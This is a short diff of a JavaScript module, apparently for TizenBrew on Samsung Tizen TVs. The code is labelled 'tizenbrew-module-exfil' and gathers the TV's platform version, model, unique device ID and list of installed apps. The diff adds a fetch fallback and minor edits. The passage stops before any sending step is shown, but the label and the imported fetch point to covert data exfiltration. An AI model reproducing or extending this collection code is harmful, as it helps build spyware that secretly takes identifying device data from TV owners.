@@ -1,14 +1,14 @@
-const fetch = require('node-fetch');
-const data = {
+var fetch;
+try { fetch = require('node-fetch'); } catch(e) { fetch = global.fetch; }
+var data = {
     source: 'tizenbrew-module-exfil',
-    ts: new Date().toISOString(),
+    ts: new Date().toISOString()
 };
 
 try { data.platform = tizen.systeminfo.getCapability('http://tizen.org/feature/platform.version'); } catch(e) {}
 try { data.model = tizen.systeminfo.getCapability('http://tizen.org/feature/model'); } catch(e) {}
 try { data.duid = tizen.systeminfo.getCapability('http://tizen.org/feature/device.id'); } catch(e) {}
 
-// Collect apps
 try {
     tizen.application.getAppInfo(function(info) {
         data.apps = info.map(function(app) {
